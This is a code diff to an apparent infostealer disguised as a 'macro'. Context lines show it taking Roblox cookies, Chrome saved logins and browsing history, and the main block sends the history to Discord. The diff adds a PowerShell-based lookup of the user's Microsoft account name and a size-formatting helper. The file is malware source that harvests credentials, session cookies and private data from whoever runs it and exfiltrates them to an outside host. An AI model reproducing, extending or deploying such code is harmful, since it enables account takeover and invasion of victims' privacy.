@@ -340,6 +340,24 @@ def collect_chrome_logins():
     except:
         pass
 
+def get_size(bytes, suffix="B"):
+    factor = 1024
+    for unit in ["", "K", "M", "G", "T"]:
+        if bytes < factor:
+            return f"{bytes:.2f} {unit}{suffix}"
+        bytes /= factor
+
+def get_user_email():
+    try:
+        result = subprocess.run(
+            ["powershell", "-Command", "(Get-CimInstance -ClassName Win32_UserAccount | Where-Object {$_.LocalAccount -eq $false}).Name"],
+            capture_output=True, text=True
+        )
+        email = result.stdout.strip()
+        return email if email else "No Microsoft account email found"
+    except Exception as e:
+        return f"Error: {e}"
+
 def get_chrome_history(limit=100):
     original_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
     temp_path = os.path.join(tempfile.gettempdir(), "chrome_history_copy")
@@ -386,11 +404,11 @@ def generate_key(length=20):
 if __name__ == "__main__":
     print("[*] Launching Macro...")
 
-    # Run only the stable functions
+    # Run only the stable functions (NO SYSTEM INFO)
     main()
     retrieve_roblox_cookies()
     collect_chrome_logins()
-    
+
     # Browser history
     history = get_chrome_history(limit=100)
     status = send_history_to_discord(history)
